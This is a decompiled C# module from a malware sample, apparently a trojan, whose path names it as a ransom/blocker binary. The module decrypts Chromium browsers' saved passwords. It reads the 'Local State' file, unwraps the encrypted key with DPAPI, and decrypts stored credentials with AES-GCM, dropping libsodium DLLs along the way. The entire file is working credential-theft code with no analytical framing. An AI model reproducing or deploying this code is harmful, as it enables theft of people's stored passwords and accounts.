// Decompiled with JetBrains decompiler
// Type: pazuzu.ChromiumBased.Crypt
// Assembly: Private, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 345B90E2-2B0E-4FAF-8906-CB0787A05498
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-5dc3085c70289a9a4a0699d883af744e8777d3b9bbe07de15e4087bcce71d3d9.exe

using pazuzu.Properties;
using SimpleJSON;
using Sodium;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace pazuzu.ChromiumBased
{
  internal class Crypt
  {
    private static void checkDlls()
    {
      if (!File.Exists("libsodium.dll"))
        File.WriteAllBytes("libsodium.dll", Resources.libsodium);
      if (File.Exists("libsodium-64.dll"))
        return;
      File.WriteAllBytes("libsodium-64.dll", Resources.libsodium64);
    }

    public static string decryptChrome(string password, string browser = "")
    {
      if (password.StartsWith("v10") || password.StartsWith("v11"))
      {
        Crypt.checkDlls();
        string path = "";
        string[] strArray = new string[3]
        {
          "",
          "\\..",
          "\\..\\.."
        };
        foreach (string str in strArray)
        {
          path = Path.GetDirectoryName(browser) + str + "\\Local State";
          if (!File.Exists(path))
            path = (string) null;
          else
            break;
        }
        byte[] numArray = DPAPI.Decrypt(Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String((string) JSON.Parse(File.ReadAllText(path))["os_crypt"]["encrypted_key"])).Remove(0, 5)));
        byte[] array1 = ((IEnumerable<byte>) Encoding.Default.GetBytes(password)).ToArray<byte>();
        try
        {
          byte[] array2 = ((IEnumerable<byte>) array1).Skip<byte>(3).Take<byte>(12).ToArray<byte>();
          return Encoding.Default.GetString(SecretAeadAes.Decrypt(((IEnumerable<byte>) array1).Skip<byte>(15).ToArray<byte>(), array2, numArray, (byte[]) null));
        }
        catch
        {
          return "failed (AES-GCM)";
        }
      }
      else
      {
        try
        {
          return Encoding.Default.GetString(DPAPI.Decrypt(Encoding.Default.GetBytes(password)));
        }
        catch
        {
          return "failed (DPAPI)";
        }
      }
    }

    public static string GetUTF8(string text)
    {
      Encoding encoding1 = Encoding.GetEncoding("UTF-8");
      Encoding encoding2 = Encoding.GetEncoding("Windows-1251");
      byte[] bytes1 = encoding2.GetBytes(text);
      byte[] bytes2 = Encoding.Convert(encoding1, encoding2, bytes1);
      return encoding2.GetString(bytes2);
    }
  }
}
